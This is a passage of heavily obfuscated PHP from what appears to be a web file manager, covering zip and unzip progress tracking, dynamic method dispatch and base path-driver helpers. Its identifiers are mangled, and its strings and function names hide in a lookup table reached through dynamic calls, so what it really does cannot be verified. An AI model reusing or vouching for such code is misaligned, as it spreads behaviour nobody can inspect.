$_SERVER[¯‘·½][975]; $exit(); } $_act = $_SERVER[¯‘·½][1246]; $_act($_file); } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $‹ªŞ…È‰ =& $_SERVER[¯‘·½]; parent::startAfter(); Hook::bind($‹ªŞ…È‰[1922], array($this, $‹ªŞ…È‰[1923])); Hook::bind($‹ªŞ…È‰[1302], array($this, $‹ªŞ…È‰[1924])); Hook::bind($‹ªŞ…È‰[1925], array($this, $‹ªŞ…È‰[1926])); $¤×íÀ©” =& $this->task; $¤×íÀ©”[$‹ªŞ…È‰[1927]] = $‹ªŞ…È‰[1303]; if (!$¤×íÀ©”[$‹ªŞ…È‰[1693]]) { $¤×íÀ©”[$‹ªŞ…È‰[1693]] = LNG($‹ªŞ…È‰[1928]); } } protected function endAfter() { $â¬…À‘Ÿ =& $_SERVER[¯‘·½]; parent::endAfter(); Hook::unbind($â¬…À‘Ÿ[1922], array($this, $â¬…À‘Ÿ[1923])); Hook::unbind($â¬…À‘Ÿ[1302], array($this, $â¬…À‘Ÿ[1924])); Hook::unbind($â¬…À‘Ÿ[1925], array($this, $â¬…À‘Ÿ[1926])); } public function updateAfter() { $©£¾òîÉ =& $_SERVER[¯‘·½]; $ÑÍõ·ï² =& $this->task; if (!$ÑÍõ·ï²[$©£¾òîÉ[1159]] || !$ÑÍõ·ï²[$©£¾òîÉ[849]]) { if ($ÑÍõ·ï²[$©£¾òîÉ[1927]] != $©£¾òîÉ[390]) { return; } } if ($ÑÍõ·ï²[$©£¾òîÉ[1927]] == $©£¾òîÉ[1303]) { $™ğˆÇšï = 0; if ($ÑÍõ·ï²[$©£¾òîÉ[1860]]) { $™ğˆÇšï = $ÑÍõ·ï²[$©£¾òîÉ[1861]] / $ÑÍõ·ï²[$©£¾òîÉ[1860]]; } $ÑÍõ·ï²[$©£¾òîÉ[1808]] = $™ğˆÇšï * 0.3; } else { if ($ÑÍõ·ï²[$©£¾òîÉ[1927]] == $©£¾òîÉ[390]) { $™ğˆÇšï = $ÑÍõ·ï²[$©£¾òîÉ[1807]] / $ÑÍõ·ï²[$©£¾òîÉ[1159]]; $ÑÍõ·ï²[$©£¾òîÉ[1808]] = 0.3 + $™ğˆÇšï * 0.4; } else { if ($ÑÍõ·ï²[$©£¾òîÉ[1927]] == $©£¾òîÉ[110]) { $–« ı“³ = 0; if ($ÑÍõ·ï²[$©£¾òîÉ[1862]] == $©£¾òîÉ[110]) { $–« ı“³ = $ÑÍõ·ï²[$©£¾òîÉ[1861]]; } $™ğˆÇšï = ($ÑÍõ·ï²[$©£¾òîÉ[1865]] + $–« ı“³) / $ÑÍõ·ï²[$©£¾òîÉ[849]]; $ÑÍõ·ï²[$©£¾òîÉ[1808]] = 0.3 + 0.4 + $™ğˆÇšï * 0.3; } } } if ($ÑÍõ·ï²[$©£¾òîÉ[1808]] > 0) { $îú½æ÷¤ = timeFloat() - $ÑÍõ·ï²[$©£¾òîÉ[1810]] - $ÑÍõ·ï²[$©£¾òîÉ[1813]]; $ÑÍõ·ï²[$©£¾òîÉ[1814]] = $îú½æ÷¤ * (1 - $ÑÍõ·ï²[$©£¾òîÉ[1808]]) / $ÑÍõ·ï²[$©£¾òîÉ[1808]]; } } public function addFile($ä¢´²çÒ) { $•ÒâÚøâ =& $_SERVER[¯‘·½]; $§¸’‹ĞË =& $this->task; $«äı¶Å = IO::info($ä¢´²çÒ); $§¸’‹ĞË[$•ÒâÚøâ[1858]] = $«äı¶Å[$•ÒâÚøâ[32]]; $§¸’‹ĞË[$•ÒâÚøâ[1860]] = $«äı¶Å[$•ÒâÚøâ[79]]; $§¸’‹ĞË[$•ÒâÚøâ[1861]] = 0; $§¸’‹ĞË[$•ÒâÚøâ[1161]] = $•ÒâÚøâ[1881]; $§¸’‹ĞË[$•ÒâÚøâ[1862]] = $•ÒâÚøâ[1303]; $§¸’‹ĞË[$•ÒâÚøâ[849]] = $«äı¶Å[$•ÒâÚøâ[79]]; $§¸’‹ĞË[$•ÒâÚøâ[1159]] = 1; $²›º¦ÉÎ = 0; $§¸’‹ĞË[$•ÒâÚøâ[1869]] = array($•ÒâÚøâ[1870] => $²›º¦ÉÎ + 1, $•ÒâÚøâ[496] => $«äı¶Å[$•ÒâÚøâ[32]], $•ÒâÚøâ[87] => $«äı¶Å[$•ÒâÚøâ[87]], $•ÒâÚøâ[586] => $«äı¶Å[$•ÒâÚøâ[586]] ? $«äı¶Å[$•ÒâÚøâ[586]] : $«äı¶Å[$•ÒâÚøâ[87]]); $this->update(); } public function zipEvent($¸Ü³êã, $ª›ôİ¹°, $ó®ôÃ¬©, $ßû³µÄ§) { $œøĞÖã‹ =& $_SERVER[¯‘·½]; $›Áãµ´ =& $this->task; $›Áãµ´[$œøĞÖã‹[1858]] = get_path_this($ª›ôİ¹°); $›Áãµ´[$œøĞÖã‹[1860]] = $ßû³µÄ§; $›Áãµ´[$œøĞÖã‹[1861]] = $ó®ôÃ¬©; $›Áãµ´[$œøĞÖã‹[1161]] = $¸Ü³êã == $œøĞÖã‹[1929] ? $œøĞÖã‹[1930] : $œøĞÖã‹[1931]; $›Áãµ´[$œøĞÖã‹[1862]] = $œøĞÖã‹[12]; $›Áãµ´[$œøĞÖã‹[849]] = $ßû³µÄ§; $›Áãµ´[$œøĞÖã‹[1927]] = $œøĞÖã‹[390]; $this->update(); } public function unzipAfter($ããÍ¶”Ç) { $ûí¾£ÄŞ =& $_SERVER[¯‘·½]; $³ÇšöÎˆ =& $this->task; $³ÇšöÎˆ[$ûí¾£ÄŞ[1927]] = $ûí¾£ÄŞ[110]; $ìÒÀ—®„ = IO::infoWithChildren($ããÍ¶”Ç); $ŸÁ¶ğú = 0; $³ÇšöÎˆ[$ûí¾£ÄŞ[1869]] = array($ûí¾£ÄŞ[1870] => $ŸÁ¶ğú + 1, $ûí¾£ÄŞ[496] => $ìÒÀ—®„[$ûí¾£ÄŞ[32]], $ûí¾£ÄŞ[87] => $ìÒÀ—®„[$ûí¾£ÄŞ[87]], $ûí¾£ÄŞ[586] => $ìÒÀ—®„[$ûí¾£ÄŞ[586]] ? $ìÒÀ—®„[$ûí¾£ÄŞ[586]] : $ìÒÀ—®„[$ûí¾£ÄŞ[87]]); if ($ìÒÀ—®„[$ûí¾£ÄŞ[33]] == $ûí¾£ÄŞ[233]) { $³ÇšöÎˆ[$ûí¾£ÄŞ[1159]] = 1; } else { $³ÇšöÎˆ[$ûí¾£ÄŞ[1159]] = $ìÒÀ—®„[$ûí¾£ÄŞ[82]][$ûí¾£ÄŞ[80]]; } $³ÇšöÎˆ[$ûí¾£ÄŞ[1161]] = $ûí¾£ÄŞ[12]; $³ÇšöÎˆ[$ûí¾£ÄŞ[1862]] = 0; $³ÇšöÎˆ[$ûí¾£ÄŞ[1807]] = 0; $³ÇšöÎˆ[$ûí¾£ÄŞ[1860]] = 0; $³ÇšöÎˆ[$ûí¾£ÄŞ[1861]] = 0; $³ÇšöÎˆ[$ûí¾£ÄŞ[1858]] = $ûí¾£ÄŞ[12]; $³ÇšöÎˆ[$ûí¾£ÄŞ[1865]] = 0; $³ÇšöÎˆ[$ûí¾£ÄŞ[849]] = $ìÒÀ—®„[$ûí¾£ÄŞ[79]]; $this->update(); self::log($ûí¾£ÄŞ[1932] . json_encode(array($³ÇšöÎˆ, $ìÒÀ—®„))); } public function nameParse($ğ’ñöÒ) { $ â¢¬îù =& $_SERVER[¯‘·½]; $£‹çì‘• =& $this->task; if ($£‹çì‘•[$ â¢¬îù[1927]] == $ â¢¬îù[1303]) { $£‹çì‘•[$ â¢¬îù[1927]] = $ â¢¬îù[390]; $£‹çì‘•[$ â¢¬îù[1865]] = 0; $£‹çì‘•[$ â¢¬îù[849]] = 0; } $Æ‡Õ¤–² = get_path_this($ğ’ñöÒ); if (strstr($Æ‡Õ¤–², $ â¢¬îù[10])) { $£‹çì‘•[$ â¢¬îù[1807]] += 1; $£‹çì‘•[$ â¢¬îù[1159]] += 1; } $£‹çì‘•[$ â¢¬îù[1858]] = $ğ’ñöÒ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÂÇè¢âû =& $_SERVER[¯‘·½]; parent::startAfter(); Hook::bind($ÂÇè¢âû[1933], array($this, $ÂÇè¢âû[1923])); Hook::bind($ÂÇè¢âû[1925], array($this, $ÂÇè¢âû[1926])); $ˆúâ³½ø =& $this->task; $ˆúâ³½ø[$ÂÇè¢âû[1927]] = $ÂÇè¢âû[1303]; if (!$ˆúâ³½ø[$ÂÇè¢âû[1693]]) { $ˆúâ³½ø[$ÂÇè¢âû[1693]] = LNG($ÂÇè¢âû[1934]); } } protected function endAfter() { $†â–¥…õ =& $_SERVER[¯‘·½]; parent::endAfter(); Hook::unbind($†â–¥…õ[1933], array($this, $†â–¥…õ[1923])); Hook::unbind($†â–¥…õ[1925], array($this, $†â–¥…õ[1926])); } public function updateAfter() { $„…á¿Ò =& $_SERVER[¯‘·½]; $ÀùËõÜó =& $this->task; if (!$ÀùËõÜó[$„…á¿Ò[1159]] || !$ÀùËõÜó[$„…á¿Ò[849]]) { return; } if ($ÀùËõÜó[$„…á¿Ò[1927]] == $„…á¿Ò[1303]) { $±³Ş—»Ê = $ÀùËõÜó[$„…á¿Ò[1861]]; if ($ÀùËõÜó[$„…á¿Ò[1862]] != $„…á¿Ò[1303]) { $±³Ş—»Ê = 0; } $Äî©–¥¦ = ($ÀùËõÜó[$„…á¿Ò[1865]] + $±³Ş—»Ê) / $ÀùËõÜó[$„…á¿Ò[849]]; $ÀùËõÜó[$„…á¿Ò[1808]] = $Äî©–¥¦ * 0.3; } else { if ($ÀùËõÜó[$„…á¿Ò[1927]] == $„…á¿Ò[390]) { $Äî©–¥¦ = $ÀùËõÜó[$„…á¿Ò[1807]] / $ÀùËõÜó[$„…á¿Ò[1159]]; $ÀùËõÜó[$„…á¿Ò[1808]] = 0.3 + $Äî©–¥¦ * 0.5; } else { if ($ÀùËõÜó[$„…á¿Ò[1927]] == $„…á¿Ò[110]) { $Äî©–¥¦ = 0; if ($ÀùËõÜó[$„…á¿Ò[1860]]) { $Äî©–¥¦ = $ÀùËõÜó[$„…á¿Ò[1861]] / $ÀùËõÜó[$„…á¿Ò[1860]]; } $ÀùËõÜó[$„…á¿Ò[1808]] = 0.3 + 0.5 + $Äî©–¥¦ * 0.2; } } } if ($ÀùËõÜó[$„…á¿Ò[1808]] > 0) { $óÎò¡ñô = timeFloat() - $ÀùËõÜó[$„…á¿Ò[1810]] - $ÀùËõÜó[$„…á¿Ò[1813]]; $ÀùËõÜó[$„…á¿Ò[1814]] = $óÎò¡ñô * (1 - $ÀùËõÜó[$„…á¿Ò[1808]]) / $ÀùËõÜó[$„…á¿Ò[1808]]; } } public function copyFileStart($äéØ¡áÖ, $É½ŞúàÍ, $µå–Ê‘, $ÙÖ–Şç÷, $¿€Á²š…, $ˆç†) { $ã×°­ƒ =& $_SERVER[¯‘·½]; parent::copyFileStart($äéØ¡áÖ, $É½ŞúàÍ, $µå–Ê‘, $ÙÖ–Şç÷, $¿€Á²š…, $ˆç†); $à…œ©Ä· =& $this->task; if ($à…œ©Ä·[$ã×°­ƒ[1927]] == $ã×°­ƒ[390]) { $à…œ©Ä·[$ã×°­ƒ[1927]] = $ã×°­ƒ[110]; } $this->update(); } public function copyFileEnd($Û–¢Èî«, $‰ùšÙè, $¢İ­Ä¿, $÷ÀĞğ›³, $Ÿ†‡«Ëì, $÷ï··¶è) { $½÷¶Ü¦ =& $_SERVER[¯‘·½]; $ÕÆ¨øµ =& $this->task; $ÕÆ¨øµ[$½÷¶Ü¦[1861]] = $ÕÆ¨øµ[$½÷¶Ü¦[1860]]; $ÕÆ¨øµ[$½÷¶Ü¦[1865]] += $ÕÆ¨øµ[$½÷¶Ü¦[1860]]; $ÕÆ¨øµ[$½÷¶Ü¦[1862]] = $½÷¶Ü¦[12]; $this->update(); } public function zipEvent($™ÖßÉåé, $ÔšÌÑ”, $õ¼º“, $¾’ÏË£Ó) { $¦è¿å… =& $_SERVER[¯‘·½]; $¼‹°²í¨ =& $this->task; $¼‹°²í¨[$¦è¿å…[1858]] = get_path_this($ÔšÌÑ”); $¼‹°²í¨[$¦è¿å…[1860]] = $¾’ÏË£Ó; $¼‹°²í¨[$¦è¿å…[1861]] = $õ¼º“; $¼‹°²í¨[$¦è¿å…[1161]] = $™ÖßÉåé == $¦è¿å…[1935] ? $¦è¿å…[1930] : $¦è¿å…[1931]; $¼‹°²í¨[$¦è¿å…[1862]] = $¦è¿å…[12]; $¼‹°²í¨[$¦è¿å…[849]] = $¾’ÏË£Ó; $¼‹°²í¨[$¦è¿å…[1927]] = $¦è¿å…[390]; $this->update(); } public function nameParse($ßØúÉ»ë) { $¯úé¯€ =& $_SERVER[¯‘·½]; $ª×Îôº‡ =& $this->task; if ($ª×Îôº‡[$¯úé¯€[1807]] < $ª×Îôº‡[$¯úé¯€[1159]]) { $×äÁúÇ® = get_path_this($ßØúÉ»ë); if (strstr($×äÁúÇ®, $¯úé¯€[10])) { $ª×Îôº‡[$¯úé¯€[1807]] += 1; } } if ($ª×Îôº‡[$¯úé¯€[1927]] == $¯úé¯€[1303]) { $ª×Îôº‡[$¯úé¯€[1927]] = $¯úé¯€[390]; } $ª×Îôº‡[$¯úé¯€[1858]] = $ßØúÉ»ë; $this->update(); } } goto F´ì¤è‡°; AŸ†§ÕÙùÑ: function binCheckBigger($•ûª…†Â, $ÓóìÇ¼œ) { return $•ûª…†Â > $ÓóìÇ¼œ; } $_SERVER[$_SERVER[„ãïšğŞ][3]] = (base64_decode('ODY5OQ==')."\x36\x39")+0;$_6z72="i0k8s96gjhlycwev54dqfna2tmu7oxpbz1r3w9p7fahb0rjmuxd4ts328ovyz1lkcgen6";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Øò‚éÂó, $ã‰”ñÕË) { $é§ì°çÉ =& $_SERVER[¯‘·½]; if (isset(self::$_methodList[$Øò‚éÂó])) { return @call_user_func_array(self::$_methodList[$Øò‚éÂó], $ã‰”ñÕË); } else { if (method_exists($this, $Øò‚éÂó)) { return call_user_func_array(array($this, $Øò‚éÂó), $ã‰”ñÕË); } else { think_exception(__CLASS__ . $é§ì°çÉ[4] . $Øò‚éÂó . $é§ì°çÉ[5]); } } } public static function __callStatic($şÚŞ¢Ü, $åËŸ•á) { if (isset(self::$_methodListStatic[$şÚŞ¢Ü])) { return call_user_func_array(self::$_methodListStatic[$şÚŞ¢Ü], $åËŸ•á); } else { if (method_exists(self, $şÚŞ¢Ü)) { return call_user_func_array(array(self, $şÚŞ¢Ü), $åËŸ•á); } else { show_json("{$şÚŞ¢Ü}\x28\x29\40\156\x6f\164\x20\x65\170\x69\x73\x74\73", !1); } } } public static function addMethod($şÙ†±ˆ­, $­áòƒÚ) { self::$_methodList[$şÙ†±ˆ­] = $­áòƒÚ; } public static function addMethodStatic($Ü»Ì£ñä, $Ê°Í‡îÜ) { self::$_methodListStatic[$Ü»Ì£ñä] = $Ê°Í‡îÜ; } } goto BÍª´®í; f­©”³¯ä¸: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ºİ™»è¶ =& $_SERVER[¯‘·½]; $this->objectDriver = array($ºİ™»è¶[60], $ºİ™»è¶[61], $ºİ™»è¶[62], $ºİ™»è¶[63], $ºİ™»è¶[64], $ºİ™»è¶[65], $ºİ™»è¶[66], $ºİ™»è¶[67], $ºİ™»è¶[68], $ºİ™»è¶[69], $ºİ™»è¶[70], $ºİ™»è¶[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ÙªıÇäı) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ÙªıÇäı, $_SERVER[¯‘·½][8]); } return $ÙªıÇäı; } public function iconvApp($ÊÁğäßĞ) { return $ÊÁğäßĞ; } public function iconvSystem($¼µø…‚Š) { return $¼µø…‚Š; } public function iconvTo($‘˜…’Éß, $šŠêÏö, $¾òÓşçå) { $”óëÖø =& $_SERVER[¯‘·½]; if (!$‘˜…’Éß || !function_exists($”óëÖø[72])) { return $‘˜…’Éß; } static $œÆù””˜ = array(); $µ·ş‘œ = $šŠêÏö . $”óëÖø[73] . $¾òÓşçå . $”óëÖø[74] . $‘˜…’Éß; if (isset($œÆù””˜[$µ·ş‘œ])) { return $œÆù””˜[$µ·ş‘œ]; } if (function_exists($”óëÖø[75])) { $‰‡³ï½ç = @mb_convert_encoding($‘˜…’Éß, $¾òÓşçå, $šŠêÏö); } else { $‰‡³ï½ç = @iconv($šŠêÏö, $¾òÓşçå, $‘˜…’Éß); } $‰‡³ï½ç = $‰‡³ï½ç ? $‰‡³ï½ç : $‘˜…’Éß; if (strstr($‰‡³ï½ç, $”óëÖø[76])) { $‰‡³ï½ç = str_replace($”óëÖø[76], $”óëÖø[11], $‰‡³ï½ç); } $œÆù””˜[$šŠêÏö . $”óëÖø[73] . $¾òÓşçå . $”óëÖø[74] . $‘˜…’Éß] = $‰‡³ï½ç; $œÆù””˜[$¾òÓşçå . $”óëÖø[73] . $šŠêÏö . $”óëÖø[74] . $‘˜…’Éß] = $‘˜…’Éß; $œÆù””˜[$¾òÓşçå . $”óëÖø[73] . $šŠêÏö . $”óëÖø[74] . $‰‡³ï½ç] = $‘˜…’Éß; $œÆù””˜[$šŠêÏö . $”óëÖø[73] . $¾òÓşçå . $”óëÖø[74] . $‰‡³ï½ç] = $‰‡³ï½ç; return $‰‡³ï½ç; } public function getPathInner($ñÊ›Äîö) { $ã¤Ù³Ïí = IO::init($ñÊ›Äîö); return $ã¤Ù³Ïí->path; } public function getPathOuter($ÁÒÀ¸ø) { $—ÙÚÚÓƒ =& $_SERVER[¯‘·½]; $ç¶”Ï²È = strlen(trim($this->pathBase, $—ÙÚÚÓƒ[8])); $ÁÒÀ¸ø = substr(trim($ÁÒÀ¸ø, $—ÙÚÚÓƒ[8]), $ç¶”Ï²È); return $this->pathDriver . $—ÙÚÚÓƒ[8] . ltrim($ÁÒÀ¸ø, $—ÙÚÚÓƒ[8]); } public function isParentOf($¨©ãöµş, $ø›ù“á) { $‘¦³¢¬ =& $_SERVER[¯‘·½]; $¨©ãöµş = rtrim(strtolower($¨©ãöµş), $‘¦³¢¬[8]) . $‘¦³¢¬[8]; $ø›ù“á = rtrim(strtolower($ø›ù“á), $‘¦³¢¬[8]) . $‘¦³¢¬[8]; $–°¼½›ç = strpos($ø›ù“á, $¨©ãöµş) === 0; return $–°¼½›ç; } public function getType() { $óéÎ¡º =& $_SERVER[¯‘·½]; $ÛÄ®µ·¿ = str_replace($óéÎ¡º[77], $óéÎ¡º[12], get_class($this)); return strtolower($ÛÄ®µ·¿); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ëÜÏôË, $¹˜®™£˜) { $Ìåí—â‘ =& $_SERVER[¯‘·½]; $‚µ´¿òÍ = rtrim($ëÜÏôË, $Ìåí—â‘[8]) . $Ìåí—â‘[8] . $¹˜®™£˜; $µ¦öÓ = $this->exist($‚µ´¿òÍ); return $µ¦öÓ ? $‚µ´¿òÍ : !1; } public function setModifyTime($ôé‚å, $ß–ö×ğ = '') { } public function renameObject($÷œö£Ì‰, $ŒÈ˜Íéš) { $ÈòîòÇ = $ŒÈ˜Íéš; $÷œö£Ì‰ = $this->getPathOuter($÷œö£Ì‰); $ŒÈ˜Íéš = $this->pathFather($÷œö£Ì‰) . $ŒÈ˜Íéš; $Ú–ËİÁ¬ = IO::copy($÷œö£Ì‰, $this->pathFather($÷œö£Ì‰), REPEAT_RENAME_FOLDER, $ÈòîòÇ); if ($Ú–ËİÁ¬) { IO::remove($÷œö£Ì‰); } return $Ú–ËİÁ¬ ? $ŒÈ˜Íéš : !1; } public function tempFile($Œ— ±‹¾ = '', $ËíüĞçÔ = '') { if (!$Œ— ±‹¾) { $Œ— ±‹¾ = rand_string(15); } $ÇìíÀø = TEMP_FILES . rand_string(15) . $_SERVER[¯‘·½][8]; @mkdir($ÇìíÀø, DEFAULT_PERRMISSIONS, !0); $–Ú…Û«‘ = $ÇìíÀø . $Œ— ±‹¾; @touch($–Ú…Û«‘); if ($ËíüĞçÔ) { file_put_contents($–Ú…Û«‘, $ËíüĞçÔ); } return $–Ú…Û«‘; } public function tempFileRemve($“î¿¼©Ù) { @unlink($“î¿¼©Ù); @rmdir($this->pathFather($“î¿¼©Ù)); } public function mkfile($ğìã½³˜, $ıôÊÜ‚œ = '', $Åä¾ñĞ» = REPEAT_RENAME) { } public function mkdir($…Ó´Û¥, $ùÏÏÑÒ = REPEAT_SKIP) { } public function delFile($ª“¶È—„) { } public function delFolder($Á®‘˜ñ™) { } public function copyFile($ëÏê½È, $–‚ôÒâ‘) { } public function moveFile($Æ¹¸ÓéÀ, $—”‹ÊèÈ) { } public function remove($ŠıùÖ÷ü) { if ($this->isFile($ŠıùÖ÷ü)) { return $this->delFile($ŠıùÖ÷ü); } return $this->delFolder($ŠıùÖ÷ü); } public function rename($¥¨¥¤éÑ, $½»°Ó¹Ë) { } public function exist($à±±Ü¦) { } public function findByHash($ô¿×ÂïÖ = '', $„·Ğ±´ = '') { return !1; } public function isFile($Ã×©Š¾å) { } public function isFolder($‘ÎÒ½ˆÛ) { } public function size($–À–Íˆ²) { } public function info($¼˜ÈŒ¥§) { } public function infoSimple($¾¢Û©ãØ) { return $this->info($¾¢Û©ãØ); } public function infoAuth($öå«œî—) { return $this->info($öå«œî—); } public function infoFull($Ê†¿šõ×) { return $this->info($Ê†¿šõ×); } public function infoFullSimple($§•¬Ë¬›) { return $this->info($§•¬Ë¬›); } public function infoWithChildren($¶ˆ¹•óã) { $õ‚Ñ«áö =& $_SERVER[¯‘·½]; static $ËĞÆ«×„ = array(); if (isset($ËĞÆ«×„[$¶ˆ¹•óã])) { return $ËĞÆ«×„[$¶ˆ¹•óã]; } $ÂªÑì ø = $this->info($¶ˆ¹•óã); if ($ÂªÑì ø && $ÂªÑì ø[$õ‚Ñ«áö[33]] == $õ‚Ñ«áö[78]) { $ÉŸ·ÒÃì = array($õ‚Ñ«áö[79] => 0, $õ‚Ñ«áö[80] => 0, $õ‚Ñ«áö[81] => 0); $this->infoChildren($¶ˆ¹•óã, $ÉŸ·ÒÃì); $ÂªÑì ø[$õ‚Ñ«áö[79]] = $ÉŸ·ÒÃì[$õ‚Ñ«áö[79]]; $ÂªÑì ø[$õ‚Ñ«áö[82]] = array($õ‚Ñ«áö[83] => $ÉŸ·ÒÃì[$õ‚Ñ«áö[80]], $õ‚Ñ«áö[84] => $ÉŸ·ÒÃì[$õ‚Ñ«áö[81]]); $ËĞÆ«×„[$¶ˆ¹•óã] = $ÂªÑì ø; } return $ÂªÑì ø; } public function listPath($½ÀÃßÑ€, $é¥¹Á¹ê = false) { } public function has($Çæ«, $Ç’Âçˆ = false, $³çÈıñ = false) { } public function canRead($ıûÚÖĞ) { } public function canWrite($¢ºÄºŒÜ) { } public function getContent($Î†Ø—Ëƒ) { } public function setContent($ú€ú–Ø, $£ÎÅ¹ƒÜ = '') { } protected function infoChildren($¶Ôâ°¡, &$ñ»Ïûó™) { $€·‘¢É± =& $_SERVER[¯‘·½]; check_abort_echo(); $¬º·°÷• = $this->listPath($¶Ôâ°¡, !0); $¬º·°÷• = array_merge($¬º·°÷•[$€·‘¢É±[85]], $¬º·°÷•[$€·‘¢É±[86]]); foreach ($¬º·°÷• as $œê©Ü„“) { if ($œê©Ü„“[$€·‘¢É±[33]] == $€·‘¢É±[78]) { $ñ»Ïûó™[$€·‘¢É±[81]]++; $µÛÖ¡Éì = $this->getPathInner($œê©Ü„“[$€·‘¢É±[87]]); $this->infoChildren($µÛÖ¡Éì, $ñ»Ïûó™); } else { $ñ»Ïûó™[$€·‘¢É±[80]]++; $ñ»Ïûó™[$€·‘¢É±[79]] += $œê©Ü„“[$€·‘¢É±[79]]; } } } public function fileSubstr($êŸÄ‘Â, $Îë¿ÆÍé, $åÏ°Çõ´) { } public function listAll($—›Ú÷“Ï) { } public function listAllMake($›¨…Ò, &$˜®´Ìñ‰) { $å¶´Ææ =& $_SERVER[¯‘·½]; check_abort_echo(); $û–·¨’Ú = $this->listPath($›¨…Ò, !0); if (!$û–·¨’Ú) { return; } $É¨Ã¸º = array_merge($û–·¨’Ú[$å¶´Ææ[85]], $û–·¨’Ú[$å¶´Ææ[86]]); foreach ($É¨Ã¸º as $ÒÑ¹¹ó¤) { $ûÓ‚Â›ò = $ÒÑ¹¹ó¤[$å¶´Ææ[33]] == $å¶´Ææ[78]; $»õ¹ĞÂ¡ = array($å¶´Ææ[87] => $ÒÑ¹¹ó¤[$å¶´Ææ[87]], $å¶´Ææ[78] => $ûÓ‚Â›ò); if (isset($ÒÑ¹¹ó¤[$å¶´Ææ[79]])) { $»õ¹ĞÂ¡[$å¶´Ææ[79]] = $ÒÑ¹¹ó¤[$å¶´Ææ[79]]; } if (isset($ÒÑ¹¹ó¤[$å¶´Ææ[88]])) { $»õ¹ĞÂ¡[$å¶´Ææ[88]] = $ÒÑ¹¹ó¤[$å¶´Ææ[88]]; } if (!$ûÓ‚Â›ò) { $˜®´Ìñ‰[] = $»õ¹ĞÂ¡; continue; } $˜®´Ìñ‰[] = $»õ¹ĞÂ¡; $§ïÉéÊ = $ÒÑ¹¹ó¤[$å¶´Ææ[87]]; $×Ò•æÒ³ = $this->pathDriver; if (substr($ÒÑ¹¹ó¤[$å¶´Ææ[87]], 0, strlen($×Ò•æÒ³)) == $×Ò•æÒ³) { $§ïÉéÊ = substr($§ïÉéÊ, strlen($×Ò•æÒ³)); } $this->listAllMake($§ïÉéÊ, $˜®´Ìñ‰); } } public function listAllSimple($ñŞÇÜò•, $ß¨ôÏªé = false) { $ÙÙ½’×Ó = $this->listAll($ñŞÇÜò•); return $this->listAllSimpleMake($ÙÙ½’×Ó, $this->getPathOuter($ñŞÇÜò•), $ß¨ôÏªé); } public function listAllSimpleMake($‘–Úàöß, $¤…æ€÷È, $Œ»üæÙ³) { $ôöƒ˜½“ =& $_SERVER[¯‘·½]; $“õÖ¨ì = array(); $¤…æ€÷È = rtrim(get_path_father($¤…æ€÷È), $ôöƒ˜½“[8]) . $ôöƒ˜½“[8]; foreach ($‘–Úàöß as $¨¨Õ¦È’) { $ÅğÛæİ× = array($ôöƒ˜½“[87] => $¨¨Õ¦È’[$ôöƒ˜½“[87]], $ôöƒ˜½“[89] => $¨¨Õ¦È’[$ôöƒ˜½“[87]], $ôöƒ˜½“[78] => $¨¨Õ¦È’[$ôöƒ˜½“[78]]); if (isset($¨¨Õ¦È’[$ôöƒ˜½“[79]]) && !$¨¨Õ¦È’[$ôöƒ˜½“[78]]) { $ÅğÛæİ×[$ôöƒ˜½“[79]] = $¨¨Õ¦È’[$ôöƒ˜½“[79]]; } if (isset($¨¨Õ¦È’[$ôöƒ˜½“[88]])) { $ÅğÛæİ×[$ôöƒ˜½“[88]] = $¨¨Õ¦È’[$ôöƒ˜½“[88]]; } if (is_array($¨¨Õ¦È’[$ôöƒ˜½“[90]])) { $ÅğÛæİ×[$ôöƒ˜½“[89]] = $¨¨Õ¦È’[$ôöƒ˜½“[90]][$ôöƒ˜½“[87]]; $ÅğÛæİ×[$ôöƒ˜½“[79]] = $¨¨Õ¦È’[$ôöƒ˜½“[90]][$ôöƒ˜½“[79]]; $ÅğÛæİ×[$ôöƒ˜½“[88]] = $¨¨Õ¦È’[$ôöƒ˜½“[90]][$ôöƒ˜½“[88]]; } else { if (substr($¨¨Õ¦È’[$ôöƒ˜½“[87]], 0, strlen($¤…æ€÷È)) == $¤…æ€÷È) { $ÅğÛæİ×[$ôöƒ˜½“[87]] = substr($¨¨Õ¦È’[$ôöƒ˜½“[87]], strlen($¤…æ€÷È)); } } $”ó½È­ = $¨¨Õ¦È’[$ôöƒ˜½“[78]] ? $ôöƒ˜½“[8] : $ôöƒ˜½“[12]; $ÅğÛæİ×[$ôöƒ˜½“[89]] = rtrim($ÅğÛæİ×[$ôöƒ˜½“[89]], $ôöƒ˜½“[8]) . $”ó½È­; $ÅğÛæİ×[$ôöƒ˜½“[87]] = $ôöƒ˜½“[8] . trim($ÅğÛæİ×[$ôöƒ˜½“[87]], $ôöƒ˜½“[8]) . $”ó½È­; if (!$Œ»üæÙ³) { $³·—ÎÈÈ = explode($ôöƒ˜½“[8], trim($ÅğÛæİ×[$ôöƒ˜½“[87]], $ôöƒ˜½“[8])); $ÅğÛæİ×[$ôöƒ˜½“[87]] = $ôöƒ˜½“[8] . implode($ôöƒ˜½“[8], array_slice($³·—ÎÈÈ, 1)) . $”ó½È­; } $“õÖ¨ì[] = $ÅğÛæİ×; } return array_sort_by($“õÖ¨ì, $ôöƒ˜½“[87]); } public function upload($³ğ¤ÄÒŸ, $ä­Áİ…ğ, $ß›âµ¹Í = false, $øï”¼ = REPEAT_REPLACE) { } public function uploadFileByID($‚ÀÃ°ä‡, $’´Ú€Â…, $‰ÔÓ§…ë) { } public function uploadFileByPath($„¿ Ğ¬, $±»€®‡›, $ŒŸ™´‰Ê = array()) { } public function isUploadServer() { $ß¼¿›éª =& $_SERVER[¯‘·½]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ß¼¿›éª[91]) { return !0; } return $GLOBALS[$ß¼¿›éª[6]][$ß¼¿›éª[92]][$ß¼¿›éª[93]]; } public function isFileOutServer() { $áÂ‡·ÂÕ =& $_SERVER[¯‘·½]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $áÂ‡·ÂÕ[91]) { return !0; } return $GLOBALS[$áÂ‡·ÂÕ[6]][$áÂ‡·ÂÕ[92]][$áÂ‡·ÂÕ[94]]; } public function 